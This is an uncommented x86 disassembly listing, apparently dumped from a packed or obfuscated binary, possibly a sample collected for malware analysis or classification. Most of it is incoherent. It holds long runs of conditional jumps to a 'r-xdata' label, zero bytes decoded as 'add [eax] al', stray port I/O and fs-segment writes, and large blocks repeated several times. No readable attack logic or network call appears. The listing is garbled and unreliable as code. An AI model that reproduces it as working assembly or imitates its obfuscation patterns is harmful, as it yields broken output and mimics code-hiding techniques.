ja r-xdata
jg 0xffffffffff53a4e3
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
jo 0xffffffff894f7999
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_401ff1
jae r-xdata
jne r-xdata
sub ecx 0xe89c579c
jb r-xdata
jne r-xdata
sub edi 0x4c4835a
jne r-xdata
pop edx
pop ecx
pop eax
jae r-xdata
mov ecx 0xf6811c75
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
xor edi 0xaae85157
jg r-xdata
add esi 0x808f0f5a
add [ eax ] al
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd2f1b
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
jg r-xdata
jno 0xf9a7985
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push edi
push ecx
call sub_401f91
add edx 0xff05e852
jne 0xffffffffc2c14d95
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
add esp 0x4
jno r-xdata
push ebp
pushfd
push eax
pushfd
add ebx 0xdc7f585a
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push esp
push eax
call sub_401fd8
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a4e3
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c12e73
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
jo 0xffffffff894f7999
push esp
pushfd
push ecx
sub esp 0xc
call sub_401f55
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
insd
sub_4020ac
sub esp 0x14
push ebp
push edi
push esp
sub esp 0x8
call sub_402157
jns 0xffffffff9cc13019
add [ eax ] al
add [ 0xffffffff850f595a ] cl
jns r-xdata
jmp 0x1000937
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c3310e
jns r-xdata
add ebx 0x9c575756
jae r-xdata
or eax 0x8d0fb671
jne r-xdata
call 0xffffffffcec1639b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
jae r-xdata
jl 0xffffffffa1a4b3b7
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402171
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
pop ecx
add eax 0xfefc8d0f
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
jg r-xdata
jge 0x18aa72c
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jno r-xdata
xor eax 0xff56850f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jg r-xdata
jge 0xffffffffc0099742
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jg r-xdata
jl 0xe2494fb
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jo 0xc646690
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
or eax 0x850f595a
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402153
jge r-xdata
add esp 0x8
jge 0xffffffff874fd3d0
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jg r-xdata
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jne r-xdata
jpe 0x18c3310e
jns r-xdata
add ebx 0x9c575756
jae r-xdata
jo 0xc646690
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
call 0xffffffffcec1639b
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
jae r-xdata
jl 0xffffffffa1a4b3b7
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
jae r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
push es
jno r-xdata
mov esp 0xd2775a59
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
call sub_402171
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jg r-xdata
jge 0x18aa72c
sub esp 0x1c
jge r-xdata
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000937
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pop ecx
add eax 0xfefc8d0f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jae r-xdata
or eax 0x8d0fb671
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
jno r-xdata
xor eax 0xff56850f
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
jg r-xdata
jge 0xffffffffc0099742
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xe2494fb
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402157
jne r-xdata
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
pop ecx
pop edx
ja r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
jge r-xdata
sub edx 0xf281e771
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
jns r-xdata
add ebx 0x9c575756
call sub_402171
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c3310e
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jne r-xdata
jl 0xffffffffa1a4b3b7
jg r-xdata
jge 0x18aa72c
pop ecx
add eax 0xfefc8d0f
jg r-xdata
jge 0xffffffffc0099742
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000937
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
pop ecx
jae r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
jg r-xdata
jl 0xe2494fb
jae r-xdata
or eax 0x8d0fb671
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
call 0xffffffffcec1639b
jno r-xdata
add ecx 0x8d0f3a7d
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
jae r-xdata
jo 0xc646690
jne r-xdata
xor edi 0x5c775a59
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
jae r-xdata
or esi 0x937f5959
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40232c
sub esi 0xe92e7f58
push esp
push edi
call sub_40224e
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13aa99
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402164
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1d4de
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1bec2
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85ba07d
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4021a2
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_402171
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1308b
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc0099742
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1000937
push eax
push ecx
sub esp 0x10
call sub_402153
jo 0xffffffffff29af14
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59752e45
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c3310e
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe2494fb
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4b3b7
jg r-xdata
jge 0x18aa72c
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec1639b
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc646690
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4022d0
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_402164
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100a5ca
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21014
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1e470
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120a567
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c13a23
jae r-xdata
jpo 0x36287a69
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7287ab9
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_4022f3
call [ 0xfffffffff281d277 ]
je 0xffffffffff82ac1f
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402221
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101b960e
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a7a7e
